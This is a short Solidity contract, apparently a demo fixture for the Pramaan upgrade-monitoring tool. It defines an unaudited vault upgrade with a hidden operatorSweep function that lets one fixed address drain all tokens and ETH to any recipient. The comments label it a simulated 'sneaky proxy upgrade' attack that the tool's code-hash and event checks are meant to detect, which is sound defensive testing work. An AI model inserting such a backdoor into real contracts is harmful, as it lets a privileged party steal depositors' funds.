// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {VaultV2} from "./VaultV2.sol";

/// @title VaultV3Unaudited
/// @notice DEMO ONLY: an implementation that was never analysed or published in a Pramaan release. It adds a hidden
///         operator sweep. Upgrading the vault proxy to it is the "sneaky proxy upgrade" attack that the Pramaan
///         extension (implementation code-hash mismatch) and monitor (`Upgraded` event) must catch.
contract VaultV3Unaudited is VaultV2 {
    using SafeERC20 for IERC20;

    address public constant OPERATOR = 0x000000000000000000000000000000000000dEaD;

    function version() external pure override returns (string memory) {
        return "3.0.0-unaudited";
    }

    function operatorSweep(address payable to) external {
        if (msg.sender != OPERATOR) revert ZeroAmount();
        uint256 tokenAmount = token.balanceOf(address(this));
        if (tokenAmount > 0) token.safeTransfer(to, tokenAmount);
        (bool ok,) = to.call{value: address(this).balance}("");
        if (!ok) revert EthTransferFailed();
    }
}
